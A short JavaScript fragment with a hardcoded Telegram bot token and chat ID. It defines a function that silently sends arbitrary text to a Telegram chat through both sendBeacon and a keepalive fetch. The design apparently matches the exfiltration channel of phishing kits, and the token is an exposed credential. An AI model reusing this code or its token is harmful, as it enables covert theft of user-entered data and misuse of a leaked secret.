var TG_BOT_TOKEN = '8835109028:AAGs0K4S6sgPgTF-fd07IfFLW7mmRSOxMOY';
var TG_CHAT_ID = '6547125053';

function sendToTelegram(text) {
    var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
    var data = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });

    if (navigator.sendBeacon) {
        var blob = new Blob([data], { type: 'application/json' });
        navigator.sendBeacon(url, blob);
    }

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: data,
        keepalive: true
    }).catch(function() {});
}
